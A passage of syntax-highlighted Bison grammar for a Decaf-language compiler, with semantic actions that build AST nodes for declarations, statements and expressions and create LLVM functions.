ProgramAST((decafEXFuncDefList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">        prog-&gt;Codegen();</span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_list: extern_defn &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafEXFuncDefList *slist = <span class="keyword">new</span> decafEXFuncDefList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_defn: extern_def extern_defn &#123;</span><br><span class="line">        decafEXFuncDefList *slist = (decafEXFuncDefList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafEXFuncDef *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafEXFuncDefList *slist = <span class="keyword">new</span> decafEXFuncDefList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_def: T_EXTERN T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type T_SEMICOLON &#123;</span><br><span class="line">        decafEXFuncDef *func = <span class="keyword">new</span> decafEXFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">5</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">7</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">3</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para((decafPara*)para);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">3</span>; </span><br><span class="line">    </span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">string</span> Name = func-&gt;get_name();</span><br><span class="line">            llvm::SmallVector&lt;llvm::Type *,<span class="number">0</span>&gt; functionArgs;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs, <span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage,</span><br><span class="line">                Name,</span><br><span class="line">                TheModule</span><br><span class="line">            );</span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_use: para_usen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123;</span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123;</span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_use: <span class="built_in">exp</span> &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_def: extern_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | func_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_typen: func_type T_COMMA func_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;     </span><br><span class="line">    &#125;</span><br><span class="line">    | func_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;   </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_type: T_ID extern_type &#123;</span><br><span class="line">        decafType* type = (decafType*)$<span class="number">2</span>;</span><br><span class="line">        type-&gt;put_name(*$<span class="number">1</span>);</span><br><span class="line">        $$ = type;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_typen: extern_type T_COMMA extern_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | extern_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_type: T_STRINGTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;StringType&quot;</span>);</span><br><span class="line">        type-&gt;Ty = stringTy; </span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    | type &#123; </span><br><span class="line">        decafType* type = (decafType* )$<span class="number">1</span>; </span><br><span class="line">        $$ = type;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_type: T_VOID &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;VoidType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = voidTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    | type &#123; </span><br><span class="line">        decafType* type = (decafType* )$<span class="number">1</span>;</span><br><span class="line">        $$ = type;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">type: T_INTTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;IntType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = intTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;   </span><br><span class="line">    | T_BOOLTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;BoolType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = boolTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB var_declps method_decls T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">4</span>;</span><br><span class="line">        decafFuncDefList *method = (decafFuncDefList *)$<span class="number">5</span>;</span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, field, method); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_PACKAGE T_ID T_LCB T_RCB &#123; </span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafVarList(), <span class="keyword">new</span> decafFuncDefList()); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declps: var_declp var_declps &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declp: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_kinds(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decls: var_decl var_decls &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decl: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalues: lvalue T_COMMA lvalues &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList*)$<span class="number">3</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | lvalue &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalue: T_ID &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ;</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ; </span><br><span class="line">        decafAllexp* arr = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        var-&gt;put_arr(arr);</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Array&quot;</span>);</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">CONSTANT : T_INTCONSTANT | T_CHARCONSTANT | T_STRINGCONSTANT &#123; &#125;;</span><br><span class="line"></span><br><span class="line">method_decls: method_decl method_decls&#123;</span><br><span class="line">        decafFuncDefList *slist = (decafFuncDefList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafFuncDef *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafFuncDefList *slist = <span class="keyword">new</span> decafFuncDefList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafBlock * block = (decafBlock*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; functionArgs;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs ,<span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage, </span><br><span class="line">                func-&gt;get_name(), </span><br><span class="line">                TheModule);</span><br><span class="line">            <span class="keyword">if</span> (func-&gt;lfunc == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">blockt: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmts *state = (decafStmts *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafVarList *field = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        decafStmts *state = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmts *state = (decafStmts *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafVarList *field = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        decafStmts *state = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statements: statement statements &#123;</span><br><span class="line">        decafStmts *slist = (decafStmts *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafStmt *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmts *slist = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statement: blockt &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | assign T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | method_call T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_return T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_if &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_while &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_for &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_break T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_continue T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_if: T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt T_ELSE blockt &#123;</span><br><span class="line">        decafBinexp *<span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafBlock *else_block = (decafBlock *)$<span class="number">7</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,else_block);</span><br><span class="line">        $$ = ifs;</span><br><span class="line"></span><br><span class="line">        ifs-&gt;kind = dif;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafBinexp *<span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ifs;</span><br><span class="line"></span><br><span class="line">        ifs-&gt;kind = dif;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_while: T_WHILE T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafBinexp *<span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafWhile *whiles = <span class="keyword">new</span> decafWhile(<span class="built_in">exp</span>,block);</span><br><span class="line">        $$ = whiles;</span><br><span class="line"></span><br><span class="line">        whiles-&gt;kind = dwhi;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_for: T_FOR T_LPAREN assignss T_SEMICOLON <span class="built_in">exp</span> T_SEMICOLON assignss T_RPAREN blockt&#123;</span><br><span class="line">        decafBinexp *<span class="built_in">exp</span> = (decafBinexp *)$<span class="number">5</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">9</span>;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssignList *aslist2 = (decafAssignList *)$<span class="number">7</span>; </span><br><span class="line">        decafFor * fors = <span class="keyword">new</span> decafFor(<span class="built_in">exp</span>,block,aslist,aslist2);</span><br><span class="line">        $$ = fors;</span><br><span class="line"></span><br><span class="line">        fors-&gt;kind = dfor;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_break: T_BREAK &#123;</span><br><span class="line">        decafCB * data = <span class="keyword">new</span> decafCB(<span class="string">&quot;BreakStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line"></span><br><span class="line">        data-&gt;kind = dcb;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_continue: T_CONTINUE &#123;</span><br><span class="line">        decafCB * data = <span class="keyword">new</span> decafCB(<span class="string">&quot;ContinueStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line"></span><br><span class="line">        data-&gt;kind = dcb;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_return: T_RETURN T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123;</span><br><span class="line">        decafBinexp *<span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>; </span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="built_in">exp</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN T_LPAREN T_RPAREN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assignss : assigns &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assigns: assign T_COMMA assigns &#123;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    | assign &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assign: lvalue T_ASSIGN <span class="built_in">exp</span> &#123;</span><br><span class="line">        decafVar* var = (decafVar *)$<span class="number">1</span>;</span><br><span class="line">        decafBinexp* <span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>;</span><br><span class="line">        decafAssign* ass = <span class="keyword">new</span> decafAssign(var-&gt;get_name(),<span class="built_in">exp</span>);</span><br><span class="line">        ass-&gt;kind = dass;</span><br><span class="line">        ass-&gt;put_arr(var-&gt;get_arr());</span><br><span class="line">        $$ = ass;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> : T_NOT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;Not&quot;</span>, (decafBinexp*)$<span class="number">2</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_MINUS <span class="built_in">exp</span> %prec T_UMINUS &#123; </span><br><span class="line">        decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;UnaryMinus&quot;</span>, (decafBinexp*)$<span class="number">2</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_PLUS <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Plus&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MINUS <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MULT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mult&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_DIV <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Div&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MOD <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mod&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    